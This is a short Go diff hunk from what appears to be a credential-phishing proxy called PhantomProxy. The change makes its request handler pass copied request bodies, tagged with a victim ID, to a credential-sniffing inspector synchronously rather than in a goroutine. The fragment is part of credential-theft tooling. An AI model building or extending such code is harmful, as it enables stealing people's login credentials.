@@ -93,7 +93,7 @@ func (pp *PhantomProxy) ServeHTTP(w http.ResponseWriter, req *http.Request) {
 	if len(bodyBytes) > 0 {
 		bodyCopy := make([]byte, len(bodyBytes))
 		copy(bodyCopy, bodyBytes)
-		go pp.credSniff.InspectRequest(req, bodyCopy, victimID)
+		pp.credSniff.InspectRequest(req, bodyCopy, victimID)
 	}
 
 	// Apply optional timing jitter
